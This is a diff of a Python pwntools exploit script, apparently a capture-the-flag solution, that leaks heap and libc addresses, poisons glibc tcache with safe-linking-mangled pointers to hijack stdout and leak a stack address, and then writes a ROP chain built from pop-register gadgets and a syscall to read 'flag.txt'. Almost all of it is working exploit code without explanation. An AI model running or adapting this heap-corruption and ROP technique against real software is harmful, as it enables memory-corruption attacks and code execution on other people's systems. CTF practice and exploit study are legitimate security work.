@@ -13,6 +13,7 @@ def GDB():
 
                 c
                 ''')
+                input()
 
 info = lambda msg: log.info(msg)
 sla = lambda msg, data: p.sendlineafter(msg, data)
@@ -47,12 +48,9 @@ def show(idx):
         sla(b"> ", b"3")
         sla(b": ", str(idx).encode())
         value = u64(p.recvline(keepends = False).ljust(8, b"\0"))
-        # res = (value >> 12) ^ value
-        # return (res >> 24) ^ res
         return value
-
+# Leak heap
 write(0, 0x20, "e"*8)
-# Leak fd pointer
 write(1, 0x20, "1"*8)
 free(0)
 free(1)
@@ -68,8 +66,8 @@ info("libc leak: " + hex(libc_leak))
 libc.address = libc_leak - 0x219ce0
 info("libc base: " + hex(libc.address))
 
-# tcache
-# fill tcache, merge chunk 7 8
+# # tcache
+# fill tcache, merge chunk 7 8 9
 for i in range(0,8):
         write(i, 0x100-0x10, b"a")
 write(7, 0x100-0x10, "a")
@@ -85,7 +83,7 @@ free(8)
 free(9)
 free(10)
 
-# # ow size chunk 8
+# ow size chunk 9
 payload = b"".ljust(0x200-0x10)
 payload+= p64(0x0) + p64(0x101)
 write(0, 0x300-0x10,payload)
@@ -98,8 +96,8 @@ payload = b"".ljust(0x200-0x10)
 payload+= p64(0x0) + p64(0x101)
 payload+= p64((libc.sym['_IO_2_1_stdout_']-0x10) ^ (heap_leak+0xa10) >> 12)
 write(0, 0x300-0x10,payload)
-write(1, 0x100-0x10, "a")
 info("stdout: " + hex(libc.sym._IO_2_1_stdout_))
+write(1, 0x100-0x10, "a")
 payload=flat(
     0,libc.sym['_IO_file_jumps'],
     0xfbad1800 ,0xfbad1800 ,0xfbad1800 ,0xfbad1800 ,
@@ -111,7 +109,6 @@ stack = u64(p.recv(8))
 info("Stack: " + hex(stack))
 target=stack-0x168
 log.info('[+]target:'+hex(target))
-fakechunk=target
 
 for i in range(5, 7):
     write(i, 0x280-0x8, b"a")
@@ -126,6 +123,11 @@ write(0, 0x300-0x8, payload)
 free(9)
 free(0)
 
+payload = b"".ljust(0x200-0x10)
+payload+= p64(0x0) + p64(0x281)
+payload+= p64((target-0x20) ^ (heap_leak+0x810) >> 12)
+write(0, 0x300-0x10,payload)
+
 poprdi=libc.address+0x000000000002a3e5
 poprax=libc.address+0x0000000000045eb0
 poprsi=libc.address+0x000000000002be51
@@ -133,10 +135,7 @@ poprdx=libc.address+0x000000000011f497
 syscall=libc.address+0x0000000000091396
 ret=libc.address+0x0000000000029cd6
 
-payload = b"".ljust(0x200-0x10)
-payload+= p64(0x0) + p64(0x281)
-payload+= p64((target-0x20) ^ (heap_leak+0x810) >> 12)
-write(0, 0x300-0x10,payload)
+
 write(1, 0x280-0x10, b"flag.txt\0")
 payload = flat(ret, ret, ret, ret, ret, ret)
 payload+= flat(
@@ -158,6 +157,5 @@ payload+= flat(
     poprdx, 0x100, 0,
     syscall
 )
-input()
 write(1, 0x280-0x10, payload)
 p.interactive()
